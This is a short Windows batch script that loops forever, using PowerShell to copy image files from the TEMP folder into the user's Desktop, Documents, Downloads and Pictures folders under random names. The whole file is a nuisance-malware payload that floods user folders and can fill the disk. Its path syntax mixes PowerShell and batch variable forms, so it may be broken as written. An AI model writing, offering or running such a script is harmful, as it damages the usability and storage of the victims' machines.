@echo off
:loop
powershell cp %TEMP%\image.png $env:%USERPROFILE%\Desktop\%random%1.png
powershell cp %TEMP%\image2.jpg $env:%USERPROFILE%\Documents\%random%3.jpg
powershell cp %TEMP%\image3.jpg $env:%USERPROFILE%\Downloads\%random%2.jpg
powershell cp %TEMP%\image.png $env:%USERPROFILE%\Pictures\%random%1.png
goto loop
